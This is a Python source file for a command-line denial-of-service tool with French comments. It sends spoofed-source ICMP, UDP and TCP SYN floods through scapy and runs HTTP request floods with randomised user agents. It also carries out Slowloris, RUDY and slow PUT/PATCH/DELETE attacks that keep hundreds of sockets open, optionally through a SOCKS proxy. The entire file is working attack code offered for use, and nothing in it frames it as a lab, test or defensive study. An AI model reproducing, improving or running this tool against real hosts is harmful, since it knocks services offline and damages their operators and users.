#!/usr/bin/env python3

#************************************************ importation des bibliothèques nécessaires
import random
import ssl
import sys
import time
import socket
import concurrent.futures
import argparse
import logging
import urllib.parse
from colorama import Fore, Style
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP, UDP
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
import threading
import queue 
#*********************************************** importation des bibliothèques nécessaires

#*********************************************** éléments graphiques
def print_banner():
    banner = """
    \033[92m
    =====================================
    
    ██████╗  ██████╗ ███████╗                  
    ██╔══██╗██╔═══██╗██╔════╝ 
    ██║  ██║██║   ██║███████╗                                  
    ██║  ██║██║   ██║╚════██║ 
    ██████╔╝╚██████╔╝███████║      [TOOL]
    ╚═════╝  ╚═════╝ ╚══════╝                       
    
    Author : Boulakhlas Yoan
   
    ======================================
    \033[0m
    """
    print(banner)

print_banner()





class CustomHelpFormatter(argparse.HelpFormatter): #sert à personnaliser l'aide proposée par argparse
    
    def add_usage(self, usage, actions, groups, prefix=None):
        
        pass  # Ne rien faire pour supprimer l'en-tête par défaut
    


progress_printed = False  # Variable pour vérifier si les messages ont déjà été imprimés

def starting_progress():
    global progress_printed
    bar_length = 30
    
    if not progress_printed:
        progress_printed = True
    
    for i in range(bar_length + 1): #afficher la barre de progression
        progress = i / bar_length
        bar = '[' + '#' * i + ' ' * (bar_length - i) + ']' #barre de progression
        sys.stdout.write('\r' + bar + ' ' + '{:.2%}'.format(progress)) #progression de la barre
        sys.stdout.flush()
        time.sleep(0.1)
    
    if progress_printed:
        sys.stdout.write('\n')  # Nouvelle ligne après la barre de progression
       
        progress_printed = False  # Réinitialiser la variable pour les prochaines exécutions

def start_progress_bar(): #débuter la barre de progression
    global starting_progress_thread
    starting_progress_thread = threading.Thread(target=starting_progress)
    starting_progress_thread.start()

def stop_progress_bar(): #arrêter la barre de progression
    global starting_progress_thread
    starting_progress_thread.join()

def rotating_circle(progress): #définition de la rotation du cercle de progression
    circles = ['◉', '○', '◔', '◑']
    return circles[progress % len(circles)]

def rotating_circle_animation(bar_length=30): #mise en rotation du cercle à côté de la barre de progression
    global stop_animation 
    for i in range(bar_length + 1):
        progress = i / bar_length
        bar = '[' + '#' * i + ' ' * (bar_length - i) + ']'
        circle = rotating_circle(i)
        sys.stdout.write('\r' + bar + ' ' + '{:.2%} '.format(progress) + circle)
        sys.stdout.flush()
        time.sleep(0.1)
        if stop_animation:  # Vérifier si l'animation doit s'arrêter
            break
    sys.stdout.write('\n')  # Nouvelle ligne après la fin de la progression

def start_animation_thread(): #débuter l'animation
    global stop_animation
    stop_animation = False  # Réinitialiser la variable pour commencer l'animation
    animation_thread = threading.Thread(target=rotating_circle_animation)
    animation_thread.start()  # Démarrer le thread d'animation

def stop_animation_thread(): #arrêter l'animation
    global stop_animation
    stop_animation = True
#************************************************************** éléments graphiques


#************************************************************** définition du système de log
# Définir le chemin du fichier de log
log_file = "DOS.log"

# Créer un logger pour la console
console_logger = logging.getLogger("console_logger")
console_logger.setLevel(logging.INFO)

# Supprimer tous les gestionnaires existants
if console_logger.hasHandlers():
    console_logger.handlers.clear()

# Création d'un handler pour l'affichage dans la console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)
console_logger.addHandler(console_handler)

# Créer un logger pour le fichier de log
file_logger = logging.getLogger("file_logger")
file_logger.setLevel(logging.DEBUG)

# Supprimer tous les gestionnaires existants
if file_logger.hasHandlers():
    file_logger.handlers.clear()

# Création d'un handler pour l'écriture dans le fichier de log
file_handler = logging.FileHandler(log_file, mode='a')  # 'a' pour append
file_handler.setLevel(logging.DEBUG)
file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(file_formatter)
file_logger.addHandler(file_handler)

# Variable pour suivre les messages d'erreur déjà affichés
error_displayed_messages = {}

# Fonction pour journaliser les erreurs avec et sans exc_info
def log_error(message, exc_info=False):
    global error_displayed_messages
    if message not in error_displayed_messages:
        if exc_info:
            # Log vers la console sans exc_info
            console_logger.error(Fore.RED + f"{message}" + Style.RESET_ALL, exc_info=False)
            # Log vers le fichier avec exc_info
            file_logger.error(Fore.RED + f"{message}" + Style.RESET_ALL, exc_info=True)
        else:
            # Log vers la console uniquement, sans exc_info
            console_logger.error(Fore.RED + f"{message}" + Style.RESET_ALL)
        error_displayed_messages[message]=True

# Variable pour suivre les messages d'info déjà affichés
info_displayed_messages = {}

# Fonction pour journaliser les infos
def log_info(message, color='green'):
    global info_displayed_messages
    if message not in info_displayed_messages:
        # Choisir la couleur en fonction du paramètre color
        if color == 'green':
            console_logger.info(Fore.GREEN + message + Style.RESET_ALL)
        elif color == 'yellow':
            console_logger.info(Fore.YELLOW + message + Style.RESET_ALL)
        elif color == 'red':
            console_logger.info(Fore.RED + message + Style.RESET_ALL)
           
        else:
            console_logger.info(Fore.YELLOW + message + Style.RESET_ALL)
        # Ajoutez le message d'info au dictionnaire des messages déjà affichés
        info_displayed_messages[message] = True

# Variable pour suivre les messages d'avertissement déjà affichés
warning_displayed_messages = {}

def log_warning(message, color='yellow'):
    global warning_displayed_messages
    if message not in warning_displayed_messages:
        # Choisir la couleur en fonction du paramètre color
        if color == 'yellow':
            console_logger.warning(Fore.YELLOW + message + Style.RESET_ALL)
           
        else:
            console_logger.warning(Fore.YELLOW + message + Style.RESET_ALL)
    warning_displayed_messages[message] = True
#*************************************************************************** définition du système de log
def resolve_dns(target_url, target_port, source_ip):
    try:
        url_components = urllib.parse.urlparse(target_url)
        target_domain = url_components.netloc
        addrinfo_list = socket.getaddrinfo(target_domain, target_port, socket.AF_UNSPEC, socket.SOCK_STREAM)
        ipv4_address = None
        ipv6_address = None

        for addrinfo in addrinfo_list:
            family, _, _, _, sockaddr = addrinfo
            ip_address = sockaddr[0]
            if family == socket.AF_INET6:
                ipv6_address = ip_address
            elif family == socket.AF_INET:
                ipv4_address = ip_address

        if ":" in source_ip and ipv6_address:
            return ipv6_address
        elif "." in source_ip and ipv4_address:
            return ipv4_address
        else:
            log_error(f"No matching IP address family found for the source IP.", exc_info= True)
            return None
    except socket.gaierror as e:
        log_error(f"DNS resolution error for {target_url}: {e}", exc_info= True)
    
        

    except Exception as e:
        log_error(f"DNS resolution error for {target_domain}: {e}...", exc_info= True)
        


def connection_less_attacks(source_ip, target_ip, results, pause_between_requests_or_truncated_requests, protocol, target_port, results_queue, k2): #attaques non orientées connexion
    for proto in protocol: 
        if proto == 'icmp': #protocole icmp
            try:
                icmp_id = random.randint(1, 65535) #randomisation de paramètres icmp
                icmp_seq = random.randint(1, 65535) #randomisation de paramètres icmp
                if ":" in source_ip:  # IPv6
                    icmp_packet = IPv6(src=source_ip, dst=target_ip) / ICMPv6EchoRequest(id = icmp_id, seq = icmp_seq) #pâquet icmp
                else:  # IPv4
                    icmp_packet = IP(src=source_ip, dst=target_ip) / ICMP(id = icmp_id, seq = icmp_seq) #paquet icmp
        
                
                send(icmp_packet, verbose=False) #envoi du paquet
                time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1])) #temps de pause
                
                results.append(True)
                results_queue.put(True)  # Simuler un succès
                return True
            except Exception as e:
                log_error(f"Failed to send ICMP packet: {e}", exc_info= True)
                results.append(False)
                results_queue.put(False)  # Simuler un échec
    
        elif proto == 'udp': #protocole udp
            try:
                # Génération d'un message de taille aléatoire
                random_message = ''.join(random.choices(string.ascii_letters + string.digits, k=k2))
                if ":" in source_ip:  # IPv6
                    udp_packet = IPv6(src=source_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) #paquet udp
                else:  # IPv4
                    udp_packet = IP(src=source_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) #paquet udp
          
       
                udp_packet /= random_message.encode() #attribution de la charge utile au paquet
                # Ajout du message aléatoire dans la charge utile du paquet UDP
                
                send(udp_packet, verbose=False) #envoi du paquet
                time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1])) #temps de pause
                
                results.append(True)
                results_queue.put(True)  # Simuler un succès
                return True
            except Exception as e:
                log_error(f"Failed to send UDP packet: {e}", exc_info= True)
                results.append(False)
                results_queue.put(False)  # Simuler un échec
    
        elif proto == 'tcp': #protocole tcp
            try:
        
                if ":" in source_ip:  # IPv6
                    syn_packet = IPv6(src=source_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                else:  # IPv4
                    syn_packet = IP(src=source_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                
                send(syn_packet, verbose=False)
                time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1]))
                
                results.append(True)
                results_queue.put(True)  # Simuler un succès
                return True
            except Exception as e:
                log_error(f"Failed to send SYN packet: {e}", exc_info= True)
                results.append(False)
                results_queue.put(False)  # Simuler un échec

# définition des user agents à choisir aléatoirement
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
def headers(randuseragents): #éléments des headers http
    regular_headers = [ "Accept-language: en-US,en,q=0.5",
    "Connection: Keep-Alive", f"User-Agent: {random.choice(user_agents) if randuseragents else user_agents[0]}" ]
    return regular_headers
#fonctions attaques de type slow and low
def send_slow_requests(sock, request, use_https, pause_between_requests_or_truncated_requests, request_type, fragment_size, target_ip, target_url, target_port, random_param, socket_count, randuseragents, data):
    list_of_sockets=[] #liste stockant les sockets créés
    
    if request_type in ['Slowloris', 'Slow DELETE']:
      
        try:
            sock.send(request.encode("utf-8")) #envoi de la requête
                    
            regular_headers=headers(randuseragents)       #attribution des headers     
            for header in regular_headers:
                
                sock.send(f"{header}\r\n".encode("utf-8")) #envoi des headers
            log_info(f"Attacking {target_ip} with {socket_count} sockets.", color='yellow')

            log_info("Creating sockets...", color='yellow')
            for _ in range (socket_count): #création des sockets
                try:
                    log_info(f"Creating socket nr {_}", color='yellow')
                    sock=create_socket(target_ip) #création
                    sock.settimeout(5) # Timeout de 5 secondes
                    sock=socket_ssl_or_not(sock, use_https, target_url) #http ou https
                    sock.connect((target_ip, target_port)) #connexion tcp
                    sock.send(request.encode("utf-8")) #envoi requête
           
                    
                    regular_headers=headers(randuseragents)    #définition headers
                    for header in regular_headers:
                
                        sock.send(f"{header}\r\n".encode("utf-8")) #envoi headers
                    if not sock: #s'il y a un soucis on continue avec les autres sockets 
                        continue
                    list_of_sockets.append(sock) #ajout dans la liste
                    
        
                except socket.error:
                    log_error("Failed to create socket...")
                    break
                
                
                

            
            while True:
                log_info(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}", color='yellow')
                
                
                for sock in list(list_of_sockets):
                    try:
                        sock.send(f"X-a: \r\n{random_param}".encode("utf-8")) #envoi de la requête tronquée (il manque un \r\n pour que le serveur ne ferme pas la conenxion)

                        
                       

                    except socket.error:
                            
                        list_of_sockets.remove(sock) #on retire le socket s'il y a une erreur
                      
                
                for _ in range(socket_count - len(list_of_sockets)): #si un socket meurt on le recréé
                    log_info("Recreating socket...", color='yellow')
                    
                    try:
                        sock=create_socket(target_ip)
                        sock.settimeout(5) # Timeout de 5 secondes
                        sock=socket_ssl_or_not(sock, use_https, target_url)
                        
                        sock.connect((target_ip, target_port))
                        sock.send(request.encode("utf-8"))
         
                   
                        regular_headers=headers(randuseragents)
                        for header in regular_headers:
                
                            sock.send(f"{header}\r\n".encode("utf-8"))
            
                         
        
                        
                   
                        
                        list_of_sockets.append(sock)
                    except socket.error:
                        log_error("Failed to recreate socket...")
                        break
                    
                    time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1]))  #temps de pause
                    print("Sleeping off...")
                
                    
                     
                   
        
        
        except Exception as e:
            log_error(f"An error occurred : {e}", exc_info=True)
                

        
    elif request_type in ['RUDY', 'Slow PUT', 'Slow PATCH']:        #même code sauf que c'est pour des requêtes avec corps
        request_body=f"Content-Length: {len(data)}\r\n\r\n{data}" #corps de la requête 
    
        try:
            
            sock.send(request.encode("utf-8")) #envoi des requêtes 

            
            log_info(f"Attacking {target_ip} with {socket_count} sockets.", color='yellow')
            log_info("Creating sockets...", 'yellow')

            for _ in range(socket_count):
                try:
                    log_info(f"Creating socket nr {_}.", color='yellow')
                    sock=create_socket(target_ip)
                    sock.settimeout(5) # Timeout de 5 secondes
                    sock=socket_ssl_or_not(sock, use_https, target_url)
                    sock.connect((target_ip, target_port))
                    sock.send(request.encode("utf-8"))
            
                    if not sock:
                        continue
                    list_of_sockets.append(sock)
                   
                except socket.error:
                    log_error("Failed to create socket...")
                    break
                  
            while True:
                log_info(f"Sending request body fragments... Socket count: {len(list_of_sockets)}", color='yellow')

                
                for sock in list(list_of_sockets):#parcours du corps de la requête
                    try:
                        for i in range(0, len(request_body), fragment_size): #parcours du corps
                            fragment = request_body[i:i+fragment_size] #fragmentation du corps
                            
                            sock.send(fragment.encode()) #envoi des fragments
                            
                            time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1])) #temps de pause
                            print("Sleeping off...")
                    except socket.error:
                        
                        list_of_sockets.remove(sock)
                        
                
                
                for _ in range(socket_count - len(list_of_sockets)):
                    log_info("Recreating socket...", color='yellow')
                    try:
                       
                        sock=create_socket(target_ip)
                        sock.settimeout(5) # Timeout de 5 secondes
                        sock=socket_ssl_or_not(sock, use_https, target_url)
                        
                        sock.connect((target_ip, target_port))
                        sock.send(request.encode("utf-8"))
           
                        list_of_sockets.append(sock)
                    except socket.error:
                        log_error("Failed to recreate socket...")
                        break
                        
                       

                    

        except Exception as e:
            log_error(f"An error occurred: {e}", exc_info=True)
        


def create_socket(target_ip): #fonction permettant de créer le socket ipv4 ou ipv6
    try:
        socket.inet_pton(socket.AF_INET6, target_ip)
        return socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    except socket.error:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def socket_ssl_or_not(sock, use_https, target_url): #fonction prenant en charge https
    
    try:
        
        
        if use_https: 
            
            context = ssl.create_default_context() #contexte ssl
            sock=context.wrap_socket(sock, server_hostname=target_url) #encapsulation du socket dans l'entête ssl
        
        return sock  
        
            
    except Exception as e:
            log_error(f"An error occurred: {e}", exc_info=True)
            return None
def socket_tcp_http(target_ip, target_port, target_domain, max_attempts, request_type, results, fragment_size, pause_between_requests_or_truncated_requests, socket_count, results_queue, k1, k2, randuseragents): #tâche à exécuter : session TCP + requête HTTP/HTTPS
    
    attempt = 0 #tentative pour la connexion tcp
    
    regular_headers=headers(randuseragents)
   
    
    while attempt < max_attempts: #tentatives pour la session tcp
        
        try:
            
            url_components = urllib.parse.urlparse(target_domain) #extraction du nom domaine dans l'url
            target_url = url_components.netloc  #obtention de l'URL pour la comparaison entre http et https
            
            # Vérifiez si le domaine cible commence par "http://" ou "https://"
                
            if url_components.scheme == "https":
                    
                use_https = True
            else:
                use_https = False
            
            

            with create_socket(target_ip) as sock: #création de socket
                sock.settimeout(5) # Timeout de 5 secondes
                socket_ssl_or_not(sock, use_https, target_url)
                sock.connect((target_ip, target_port))
                
                
                data = None
                random_param =  ''.join(random.choices(string.ascii_letters + string.digits, k=k1)) #url de l'entête randomisée
                if request_type in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
                    data = ''.join(random.choices(string.ascii_letters + string.digits, k=k2)) #corps de la requête randomisé
                        
                    regular_headers=headers(randuseragents)  #entêtes randomisées  
                    request = f"{request_type} /?{random_param} HTTP/1.1\r\n"#requête
                    request += f"Host: {target_url}\r\n"#ajout de l'url
                    request += "\r\n".join(regular_headers) + "\r\n" #ajout des headers
                    if request_type in ["POST", "PUT", "PATCH"]:
                        request += f"Content-Length: {len(data)}\r\n\r\n{data}" #ajout du corps si nécessaire

                    try:
                    
                        sock.send(request.encode("utf-8"))

                        
                        time.sleep(random.uniform(pause_between_requests_or_truncated_requests[0], pause_between_requests_or_truncated_requests[1]))  # Pause aléatoire entre chaque requête
                    except Exception as e:
                        log_error(f"An error occurred: {e}", exc_info=True)
                    
                    
                    


                elif request_type in ["Slow DELETE", "Slow PUT", "Slow PATCH"]:
                    data = ''.join(random.choices(string.ascii_letters + string.digits, k=k2))
                    regular_headers=headers(randuseragents)
                    
                    if request_type == "Slow DELETE":
                        method= "DELETE"
                        request = f"{method} /?{random_param} HTTP/1.1\r\n"
                        request += f"Host: {target_url}\r\n"
                    elif request_type == "Slow PUT":
                        method = "PUT"
                        request = f"{method} /?{random_param} HTTP/1.1\r\nHost: {target_url}\r\n" + "\r\n".join(regular_headers) + "\r\n"   
                    elif request_type == "Slow PATCH":
                        method = "PATCH"
                        request = f"{method} /?{random_param} HTTP/1.1\r\nHost: {target_url}\r\n" + "\r\n".join(regular_headers) + "\r\n"     
                        
                    send_slow_requests(sock, request, use_https, pause_between_requests_or_truncated_requests, request_type, fragment_size, target_ip, target_url, target_port, random_param, socket_count, randuseragents, data)
                elif request_type in ["Slowloris", "RUDY"]:
                    regular_headers=headers(randuseragents)
                    data = ''.join(random.choices(string.ascii_letters + string.digits, k=k2)) if request_type  == "RUDY" else ''
                   
                    if request_type == "Slowloris":
                        method= "GET"
                        request = f"{method} /?{random_param} HTTP/1.1\r\n"
                        request += f"Host: {target_url}\r\n"
                    elif request_type == "RUDY":
                        method = "POST"
                        request = f"{method} /?{random_param} HTTP/1.1\r\nHost: {target_url}\r\n" + "\r\n".join(regular_headers) + "\r\n"
                   
                    send_slow_requests(sock, request, use_https, pause_between_requests_or_truncated_requests, request_type, fragment_size, target_ip, target_url, target_port, random_param, socket_count, randuseragents, data)
               
                
               
            
                    

                results.append(True)  # Marquer ce thread comme réussi
                results_queue.put(True)  # Simuler un succès
                return True
        
        except ConnectionRefusedError:
            log_error(f"The connection has been refused by the server.", exc_info= True)
            
        
        except TimeoutError:
            log_error(f"The connection has expired.", exc_info= True)
           
        
        except Exception as e:
            log_error(f"Error sending request : {e}", exc_info=True)
            time.sleep(5)
            
        time.sleep(5)
        attempt += 1
        results_queue.put(False)  # Simuler un échec
        results.append(False)  # Marquer ce thread comme ayant échoué
            
            
    results_queue.put(False)  # Simuler un échec
    results.append(False)  # Marquer ce thread comme ayant échoué
    log_error(f"TCP connection failed after {max_attempts} attempts", exc_info= True)
    return False



def main():
    #****************************************************************************************** arguments ligne de commande
    parser = argparse.ArgumentParser(prog=Fore.RED + "FATAL_ERROR" + Style.RESET_ALL ,description="**{THIS SCRIPT SUPPORTS A VARIETY OF DoS ATTACKS (connection-oriented, non-connection-oriented and well-known attacks like Slowloris or RUDY (R U DEAD YET))...}** : [positional arguments] ==> /!\ MANDATORY /!\ : <target_url> <target_port> <source_ip>, [options] ==> facultative : --max_attempts --max_concurrent_threads --request_type --k1 --k2 --fragment size --pause_between_requests_or_truncated_requests --protocol --socket_count --randuseragents --useproxy --proxy_host --proxy_port.", formatter_class=CustomHelpFormatter)
    parser.add_argument("--target_url", "-URL", type=str, help="/!\ MANDATORY /!\ ***URL containing the domain name of the target to be resolved***.")
    parser.add_argument("--target_port", "-PORT", type=int, help="/!\ MANDATORY /!\ ***Port where the target is listening***.")
    parser.add_argument("--source_ip", "-IP", nargs='?', default=None, type=str, help="/!\ MANDATORY /!\ ***Source IP address for the packets***.")
    parser.add_argument("--max_attempts", "-a", type=int, default=5, help="Maximum number of attempts to establish a TCP connection with the target (default: 5), you can modify this value.")
    parser.add_argument("--max_concurrent_threads", "-t", type=int, default=8, help="Maximum number of threads to be used simultaneously (default: 8), you can modify this value. /!\ WARNING /!\, please take into account the number of threads on your host machine's processor, so as not to overload it.")
    parser.add_argument("--request_type", "-r", choices=["GET", "POST", "PUT", "PATCH", "DELETE", "Slowloris", "RUDY", "Slow DELETE", "Slow PUT", "Slow PATCH"], default="GET", help="Type of request to send (default: GET), you can change this value to choose the type of request you want to send.")
    parser.add_argument("--protocol", "-p", nargs='+', choices=['icmp', 'udp', 'tcp', 'http'], default=['icmp'], help="Protocols to use for the attack (default: icmp).")
    parser.add_argument("--fragment_size", "-f", type=int, default=10, help="Fragment size for RUDY requests (default: 10).")
    parser.add_argument("--pause_between_requests_or_truncated_requests", "-pb", nargs=2, type=float, default=[0, 0], help="Pause range between requests or truncated requests, if you want a random pause choose two different values (default: [0, 0]).")
    parser.add_argument("--k1", "-k1", type=int, nargs=2, default=[1000, 1000], help="Range of length of data for payload (header) (default: [1000, 1000]). Specify two values for a range.")
    parser.add_argument("--k2", "-k2", type=int, nargs=2, default=[1000, 1000], help="Range of length of data for payload (body) (default: [1000, 1000]). Specify two values for a range.")
    parser.add_argument("--socket_count", "-s", type=int, default=200, help="Number of socket to be used simultaneously for slow request attacks (default: 200), you can modify this value.")
    parser.add_argument("--randuseragents", "-ru", action="store_true", help="Randomizes user-agents with each request")
    parser.add_argument("--useproxy", "-x", dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
    parser.add_argument("--proxy-port", "-pp", type=int, default="8080", help="SOCKS5 proxy port")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
    # Si aucun argument n'est passé, afficher un message d'erreur
    if len(sys.argv) == 1:
        log_error("No arguments provided. To display help, use the --help or -h option...")
        sys.exit(1)
    
    try:
        args = parser.parse_args()
    except SystemExit as e:
        if e.code == 0:  # Code 0 signifie que le programme se termine normalement
            sys.exit(0)
        elif "--help" in sys.argv or "-h" in sys.argv:
            parser.print_help()
            sys.exit(0)
        else:
            log_error(f"Invalid command(s). To display help, use the --help or -h option...")
            sys.exit(e.code)
    except Exception as e:
        log_error(f"An error has occurred... : {e}", exc_info=True)
        sys.exit(1)
    
    
    max_attempts = args.max_attempts
    max_concurrent_threads = args.max_concurrent_threads
    target_port = args.target_port
    target_url=args.target_url
    request_type = args.request_type
    protocol = args.protocol
    source_ip=args.source_ip
    fragment_size = args.fragment_size
    pause_between_requests_or_truncated_requests = args.pause_between_requests_or_truncated_requests
    socket_count=args.socket_count
    randuseragents=args.randuseragents
    useproxy=args.useproxy
    proxy_port=args.proxy_port
    proxy_host=args.proxy_host
    min_k1, max_k1 = args.k1  # Déballer les valeurs min_k1 et max_k1 de la liste args.k1

    k1 = random.randint(min_k1, max_k1)  # Générer une longueur aléatoire entre les deux valeurs spécifiées
    
    min_k2, max_k2 = args.k2  # Déballer les valeurs min_k2 et max_k2 de la liste args.k2

    k2 = random.randint(min_k2, max_k2)  # Générer une longueur aléatoire entre les deux valeurs spécifiées
    
    #**************************************************************************************** Définition des arguments en ligne de commande et de l'aide pour l'utilisateur

    reponse = input("Would you like to continue? (yes/no): ")
    if reponse.lower() == "yes":
        print("Continuing...")
     
    elif reponse.lower() == "no":
        print("Stopping...")
        raise SystemExit  # Cette ligne arrête complètement le programme
    else:
        print("Invalid input. Please enter 'yes' or 'no'.")
    
    
    if useproxy: #utilisation d'un proxy
   
        try:
            import socks

            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
            socket.socket = socks.socksocket
            logging.info("Using SOCKS5 proxy for connecting...")
        except ImportError:
            logging.error("Socks Proxy Library Not Available!")
            sys.exit(1)
    
    if 'http' not in protocol:
        if source_ip is None:
            log_error(f"Source IP address is required for ICMP, UDP, and TCP attacks.", exc_info= True)
            return

    # Résolution DNS pour obtenir l'adresse IP de la cible
    
    start_progress_bar()
    start_animation_thread()
    target_ip = resolve_dns(target_url, target_port, source_ip)
    stop_progress_bar()
    stop_animation_thread()
    
    if target_ip:
        log_info("DNS resolution was successful or not necessary if you contacted a local service...")
    else: 
        log_error(f"Unable to resolve IP address for specified domain, check the connection...", exc_info= True)
        return
    
    if max_attempts <= 0 or max_concurrent_threads <= 0:
        log_error(f"/!\ : max_attempts and max_concurrent_threads must be positive.", exc_info= True)
        return

    if max_concurrent_threads > 8:
        log_warning("/!\ WARNING /!\: Using a large number of threads can overload your system...")

    
    
    #Boucle infinie
    try:
        start_time = time.time()

        successful_requests=0
        failed_requests=0
        
        
        results_queue = queue.Queue()  # Queue pour stocker les résultats de chaque thread
        results = []  # Liste pour stocker les résultats de chaque thread
        futures = []  # Liste stockant un lot de threads exécutant la tâche complète "socket_tcp_http"
            
        while True:
            
            
            
            
            
            with concurrent.futures.ThreadPoolExecutor(max_concurrent_threads) as executor: #définition du pool de thread
                for proto in protocol:
                    if proto in ['icmp', 'udp', 'tcp']: #exécution des tâches
                        futures += [executor.submit(connection_less_attacks, source_ip, target_ip, results, pause_between_requests_or_truncated_requests, protocol, target_port, results_queue, k2) for _ in range(max_concurrent_threads)]   
              
                    elif proto == 'http': #exécution des tâches
                        futures += [executor.submit(socket_tcp_http, target_ip, target_port, target_url, max_attempts, request_type, results, fragment_size, pause_between_requests_or_truncated_requests, socket_count, results_queue, k1, k2, randuseragents) for _ in range(max_concurrent_threads)]
                
                 
        
                for future in concurrent.futures.as_completed(futures): #si tâche réussie alors on incrémente le compteur
                    
                    future.result()
                    
                      


        
     
            while not results_queue.empty():
                success = results_queue.get()
                if success:
                    successful_requests += 1
            
            # Vérifier si tous les threads ont réussi au moins une fois une tâche, le but ici est seulement de prévenir l'utilisateur qu'il n'y a à priori pas de problèmes au niveau des protocoles
        
            if successful_requests >= len(futures):
                log_info(f"{', '.join(protocol).upper()} packets sent successfully at least one time for each thread...")
                log_info("Attack in progress...")
    
    except KeyboardInterrupt:
                log_info("The script has been stopped by the user.", color='yellow')
                end_time = time.time()
                elapsed_time = end_time - start_time
                log_info(f"Time elapsed since requests were sent : {elapsed_time} seconds", color = 'yellow')
                if request_type in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
                    log_info(f"Number of successful requests : {successful_requests}")
                    log_info(f"Number of failed requests : {failed_requests}", color = 'red')
                sys.exit(0)
    
    except Exception as e:
        log_error(f"An error occurred : {e}", exc_info=True)
    

if __name__ == "__main__":
    main()

#/!\ DoS orientés connexion et non orientés connexion